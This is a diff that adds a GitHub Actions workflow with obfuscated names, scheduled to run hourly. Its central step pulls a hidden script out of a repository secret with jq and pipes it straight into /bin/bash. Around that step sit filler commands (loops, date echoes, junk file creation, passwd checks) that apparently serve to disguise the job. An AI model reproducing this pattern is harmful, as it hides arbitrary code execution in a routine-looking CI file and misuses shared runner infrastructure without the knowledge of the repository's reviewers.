@@ -1,0 +1,25 @@
+name: doushiwo1234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: doushiwo1234
+        env:
+          c5700: ${{ secrets.c5700 }}
+        run: |
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo $c5700 | jq -r .q15860 | /bin/bash
+          which uname
+          which bash 2>/dev/null || echo "Bash not in path"
+          touch tmp.abc.tmp.abc
+          pushd ~
+          for i in 1 2 3; do echo "Loop $i"; done
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo "Date only: $(date +%F)"
+          echo "Time: $(date +%H:%M:%S)"
+          cd ~
